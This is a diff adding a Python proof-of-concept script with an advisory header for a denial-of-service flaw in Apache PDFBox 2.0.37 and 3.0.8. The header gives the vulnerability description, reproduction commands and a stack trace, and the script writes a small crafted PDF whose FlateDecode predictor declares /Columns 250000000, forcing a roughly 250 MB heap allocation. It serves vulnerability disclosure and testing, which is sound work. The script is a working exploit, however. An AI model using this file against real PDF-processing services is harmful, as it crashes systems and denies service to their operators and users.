@@ -1,0 +1,81 @@
+#!/usr/bin/env python
+#
+#
+# Apache PDFBox 3.0.8 Flate PNG Predictor Disproportionate Heap Allocation DoS
+#
+#
+# Vendor: The Apache Software Foundation
+# Product web page: https://pdfbox.apache.org
+# Affected version: 2.0.37, 3.0.8
+# Fixed version: 2.0.38, 3.0.9, 4.0.0
+#
+# Summary: The Apache PDFBox® library is an open source Java tool for working
+# with PDF documents. This project allows creation of new PDF documents, manipulation
+# of existing documents and the ability to extract content from documents. Apache
+# PDFBox also includes several command-line utilities.
+#
+# Desc: The library is prone to a denial of service condition caused by a disproportionate
+# heap allocation in the Flate decode PNG predictor path. When a stream is filtered
+# with FlateDecode and a predictor is declared, PDFBox sizes an internal decoding
+# buffer directly from the PDF-supplied decode parameters (/Columns, /Colors and
+# /BitsPerComponent) inside org.apache.pdfbox.filter.Predictor. The /Columns value
+# is taken from the untrusted document and is not bounded against the actual stream
+# length, so a crafted stream a few hundred bytes in size forces an allocation of
+# hundreds of megabytes. A confirmed 396 byte PDF drives an allocation of roughly
+# 250 MB inside Predictor$PredictorOutputStream.<init>, and under a constrained heap
+# the process terminates with java.lang.OutOfMemoryError.
+#
+# The condition is reached during normal document processing when the affected
+# stream is decoded (content stream, object stream, image XObject or cross-reference
+# stream), requires no authentication and no user interaction beyond submitting a
+# PDF to a feature that already accepts one. PDFBox guards the integer overflow case,
+# throwing an IOException ("Calculated row length is negative") for values that wrap
+# negative, but the large positive range remains unbounded. A related unbounded FlateDecode
+# output buffer (decompression bomb, a small stream inflating to gigabytes) amplifies
+# the same denial of service class.
+#
+# -----------------------------------------------------------------------------------
+# $ javac -cp pdfbox-app-3.0.8.jar PdfboxTrace.java
+# $ java -Xmx256m -cp .:pdfbox-app-3.0.8.jar PdfboxTrace bomb_predictor.pdf
+#
+# !!! java.lang.OutOfMemoryError: Java heap space
+#     at org.apache.pdfbox.filter.Predictor$PredictorOutputStream.<init>(Predictor.java:294)
+#     at org.apache.pdfbox.filter.Predictor.wrapPredictor(Predictor.java:245)
+#     at org.apache.pdfbox.filter.FlateFilter.decode(FlateFilter.java:44)
+#     at org.apache.pdfbox.filter.Filter.decode(Filter.java:107)
+#     at org.apache.pdfbox.cos.COSInputStream.create(COSInputStream.java:57)
+#     at org.apache.pdfbox.cos.COSStream.createInputStream(COSStream.java:172)
+# -----------------------------------------------------------------------------------
+#
+# Tested on: Eclipse Temurin OpenJDK 21.0.6 (LTS)
+#            Microsoft Windows 10
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2026-6004
+# Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-6004
+# Vendor 6265 bug: https://issues.apache.org/jira/browse/PDFBOX-6265
+# Vendor 3712 bug: https://issues.apache.org/jira/browse/PDFBOX-3712
+#
+#
+# 21.08.2026
+#
+
+
+import zlib
+
+tiny = zlib.compress(b"\x00" * 8, 9)
+obj4 = (b"<</Length %d/Filter/FlateDecode"
+        b"/DecodeParms<</Predictor 12/Columns 250000000/Colors 1"
+        b"/BitsPerComponent 8>>>>" % len(tiny))
+
+pdf  = b"%PDF-1.5\n"
+pdf += b"1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n"
+pdf += b"2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n"
+pdf += b"3 0 obj\n<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]" \
+       b"/Contents 4 0 R/Resources<<>>>>\nendobj\n"
+pdf += b"4 0 obj\n" + obj4 + b"\nstream\n" + tiny + b"\nendstream\nendobj\n"
+open("bomb_predictor.pdf", "wb").write(pdf)
